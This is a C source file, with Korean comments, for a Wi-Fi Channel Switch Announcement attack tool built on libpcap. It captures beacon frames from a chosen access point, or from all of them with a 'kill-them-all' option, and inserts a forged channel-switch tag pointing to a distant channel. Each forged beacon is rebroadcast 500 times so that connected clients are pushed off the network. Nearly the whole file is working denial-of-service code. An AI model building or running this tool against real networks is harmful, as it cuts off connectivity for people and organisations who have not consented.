#include "csa_attack.h"
#include "option.h"
#include "channel_hopper.h"

int myCh;

int Wireless_Channel[58] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
                            11, 12, 13, 14, 15, 16, 17, 18, 20, 24,
                            28, 32, 36, 40, 44, 48, 52, 56, 60, 64,
                            68, 72, 76, 80, 84, 88, 92, 96, 100, 104,
                            108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
                            149, 153, 157, 161, 165, 169, 173, 177};

void usage()
{
    puts("<Require Element>");
    puts(" -i : Interface");
    puts(" -s : SSID");
    puts(" -a : AP mac, ex > aa:bb:cc:dd:ee:ff");
    puts(" if you input -a, you don't have to input -s, The opposite is also the same");

    puts("<Option>");
    puts(" -c : Fixed your Channel");
    puts(" -t : Time(sec)");
    puts(" -d : STA mac, Attack Type, if This option exists, the packet is sent as unicast");
    puts(" -x : if you input \"kill-them-all\" kill all Wi-Fi,This option doesn't need any option");

    puts("<Example>");
    puts(" ./csa_attack -i <interface> -s <SSID>");
}

Param param = {
    .dev_ = NULL};

bool parse(Param *param, int argc, char *argv[])
{

    if (!Op_i && (!Op_s || !Op_a))
    {
        printf("argc : %d\n", argc);
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

void Mac_(const char *arr, u_char mac_addr[6])
{
    int a;
    if (strlen(arr) != 17)
    {
        printf("Maclen error!!\n");
    }
    char cpyarr[18];
    memcpy(cpyarr, arr, 17);
    for (int i = 0; i < 6; i++) // 입력Mac값의 콜론 제거
    {
        cpyarr[i * 3 + 2] = '\0';
        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
        mac_addr[i] = (u_char)a;
    }
}

bool isBeacon(const u_char *packet)
{
    Radio *rad;
    rad = (Radio *)packet;
    // printf("rev : %d\npad : %d\n len:%d\n",rad->hdr_rev,rad->hdr_pad,rad->hdr_len);
    BeaconHd *bec;
    bec = (BeaconHd *)(packet + rad->hdr_len);
    if (htons(bec->type) == 0x8000)
    {
        return true;
    }
    else
    {
        return false;
    }
}

bool isSSID(const u_char *packet, struct pcap_pkthdr* header, unsigned char *ssid)
{
    //printf("caplen == %d\n",header->caplen);
    int ssid_len = strlen(ssid);
    Radio *rad = (Radio *)packet;
    u_char *packet_ = (u_char *)(packet + rad->hdr_len + 24 + 12);

    int taglen = header->caplen - rad->hdr_len - 12 - 24 - 4;
    //printf("caplen : %d\n",caplen);
    for (int i = 0; i < taglen;)
    {
        Tag *tag = (Tag *)(packet_ + i);
        if (tag->tag_number == 0)
        {
            // for (int i = 0; i < ssid_len; i++)
            // {
            //     printf("%c",*(packet_+2+i));
            // }puts("");
            if (strncmp(ssid, packet_ + 2, ssid_len) == 0)
            {
                return true;
            }
        }
        i += tag->tag_length + 2;
    }
    return false;
}

bool arrncmp(const char *arr1, const char *arr2, int len)
{
    for (int i = 0; i < len; i++)
    {
        if (arr1[i] != arr2[i])
        {
            return false;
        }
    }
    return true;
}

void expArray(u_char *arr, int len, int pivot)
{ // len : 배열의 길이, pivot : 어디까지 뒤로 밀어낼지
    // realloc으로 미리 공간 늘려주고 보내줘야함
    for (int i = len - 1 - 5; i >= pivot; i--)
    {
        arr[i + 5] = arr[i];
    }
}

void PtData(const u_char *packet, u_char caplen)
{
    for (int i = 0; i < caplen; i++)
    {
        if (i % 8 == 0 && i != 0 && i % 16 != 0)
        {
            printf("| ");
        }
        if (i % 16 == 0 && i != 0)
        {
            printf("\n");
        }
        *(packet + i) < 16 ? printf("0%x ", *(packet + i)) : printf("%x ", *(packet + i));
    }
    printf("\n");
}


int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
{
    pthread_t channel_chg;
    int threadErr;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(opt->Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    time_t start_time, now_time;
    double duration;
    if (Op_t)
    {
        start_time = time(NULL);
    }
    int packet_count = 0;
    int i = 0;
    int captureC = 0;
    while (true)
    {
        captureC++;
        if (!Op_c)
        {

            myCh = Wireless_Channel[i];
            i < 57 ? (i += 1) : (i = 0);
            channel_hopping(opt->Interface, myCh);
        }
        else
        {
            channel_hopping(opt->Interface, opt->Op_f_ch);
            myCh = opt->Op_f_ch;
        }
        //printf("Channel : [%d]\n",myCh);
        if (Op_t)
        {
            now_time = time(NULL);
            duration = (double)(now_time - start_time);
            if (duration >= opt->Op_t_time)
            {
                break;
            }
        }

        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        // PtData(packet,header->caplen);

        // 채널변경

        // printf("mych : %d\n", myCh);

        unsigned char ApCh = myCh;

        Radio *rad;
        rad = (Radio *)packet;
        u_char AP_MAC[6];
        bool isFcS;

        u_char *send_packet;

        // Broadcast
        if (!Op_d)
        {
            if (isBeacon(packet))
            {
                /*----------이거 함수화----------*/
                //printf("caplen : %d\n",header->caplen);
                unsigned char csaCh;
                srand(time(NULL));

                while (true)
                {
                    int random = rand() % 58;
                    if (Wireless_Channel[random] != ApCh && (Wireless_Channel[random] > ApCh + 50 || Wireless_Channel[random] < ApCh - 50))
                    {
                        csaCh = Wireless_Channel[random];
                        break;
                    }
                }

                /*----------이거 함수화----------*/
                if ((rad->flags >> 4) == 1)
                {
                    isFcS = true;
                }
                else
                {
                    isFcS = false;
                }
                if (Op_a)
                {
                    Mac_(opt->Input_AP_MAC, AP_MAC);
                }
                BeaconHd *becH;
                becH = (BeaconHd *)(packet + rad->hdr_len);
                //printf("caplen : %d\n",header->caplen);
                if ((Op_a && arrncmp(AP_MAC, becH->mac_src, 6)) || (Op_s && isSSID(packet, header, opt->Input_SSID) || Op_x))
                {
                    send_packet = (u_char *)malloc(sizeof(u_char) * (header->caplen));
                    if (send_packet == NULL)
                    {
                        continue;
                    }
                    memcpy(send_packet, packet, header->caplen);
                    /*----------이거 함수화----------*/
                    if (isFcS)
                    {
                        *(send_packet + 16) = 0x00; // fcs
                    }
                    /*----------이거 함수화----------*/
                    Radio *rad;
                    rad = (Radio *)send_packet;
                    u_int not_tag_len = (rad->hdr_len) + 24 + 12;
                    u_int tag_len = (header->caplen) - 4 - not_tag_len;
                    u_int total_len = not_tag_len + tag_len;
                    Tag *tagged;
                    bool csa_inject = false;
                    int error;

                    char *ssid;
                    int ssid_len = 0;
                    /*----------이거 함수화----------*/
                    for (int i = 0; i < tag_len; i)
                    {
                        tagged = (Tag *)(send_packet + not_tag_len + i);
                        if (tagged->tag_number == 0)
                        {
                            ssid_len = tagged->tag_length;
                            ssid = send_packet + not_tag_len + i + 2;
                        }
                        if (tagged->tag_number == 3)
                        {
                            ApCh = *(send_packet + not_tag_len + i + 2);
                        }
                        if (tagged->tag_number > 37)
                        {
                            total_len += 5;                                                                    // CSA넣을 5byte 증가
                            char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
                            if (tmp != NULL)
                            {
                                send_packet = tmp;
                            }
                            expArray(send_packet, total_len, not_tag_len + i - 1); // csa를 넣을 공간 생성
                            /*----------이거 함수화----------*/
                            *(send_packet + not_tag_len + i) = 0x25;
                            *(send_packet + not_tag_len + i + 1) = 0x3;
                            *(send_packet + not_tag_len + i + 2) = 0x1;
                            *(send_packet + not_tag_len + i + 3) = csaCh;
                            *(send_packet + not_tag_len + i + 4) = 0x1;
                            csa_inject = true;
                            break;
                        }
                        i += tagged->tag_length + 2;
                    }
                    if (csa_inject == false)
                    { // tag를 끝까지 돌아도 37(CSA)을 넘는 테그가 없다면

                        char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
                        if (tmp != NULL)
                        {
                            send_packet = tmp;
                        }
                        /*----------이거 함수화----------*/
                        *(send_packet + header->caplen) = 0x25;
                        *(send_packet + header->caplen + 1) = 0x3;
                        *(send_packet + header->caplen + 2) = 0x1;
                        *(send_packet + header->caplen + 3) = csaCh;
                        *(send_packet + header->caplen + 4) = 0x1;
                    }
                    bool Ds = false;
                    for (int i = 0; i < 500; i++)
                    {
                        if (i == 0)
                        {
                            if (ApCh != myCh)
                            {
                                channel_hopping(opt->Interface, ApCh);
                                Ds = true;
                            } // Ds 있어서 채널변경하고 전송했으면 다시 원래 채널로 바꾸기 추가하자
                            printf("[%d] [ch:%d] [%d]->[%d] SSID : ", ++packet_count, myCh, ApCh, csaCh);
                            for (int i = 0; i < ssid_len; i++)
                            {
                                printf("%c", *(ssid + i));
                            }
                            puts(" Kill network!!!");
                        }

                        if (pcap_sendpacket(pcap, send_packet, total_len) != 0)
                        {
                            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
                            return -1;
                        }
                    }
                    if (Ds)
                    {
                        channel_hopping(opt->Interface, myCh);
                    }

                    free(send_packet);
                }
            }
            else
            {
                if (captureC % 8 == 0)
                {
                    i++;
                }

                continue;
            }
        }
        else // Unicast
        {
        }
    }
    pcap_close(pcap);
    return 0;
}
